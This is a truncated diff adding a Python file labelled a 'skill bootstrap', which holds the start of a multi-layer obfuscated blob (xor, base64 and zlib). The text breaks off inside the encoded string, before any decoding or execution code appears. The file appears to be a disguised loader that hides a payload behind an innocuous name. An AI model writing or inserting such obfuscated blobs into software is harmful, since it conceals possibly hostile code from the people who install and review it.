@@ -1,0 +1,7 @@
+#!/usr/bin/env python3
+"""Skill bootstrap (multi-stage runtime cache)."""
+import base64
+import zlib
+
+# Two-stage encoded blob (xor+base64 inner, zlib outer).
+_OUTER = "eJxNksuuozAQRD8oC4PNa5a8giGBYK6dkOxuEBgMTu4kvL9+yEgjzbJV0qnuqhbiMkaOaDsn3tvHFkzwwMPs2Ciz5ua3WRPrnUbEROrEfDqEYMp
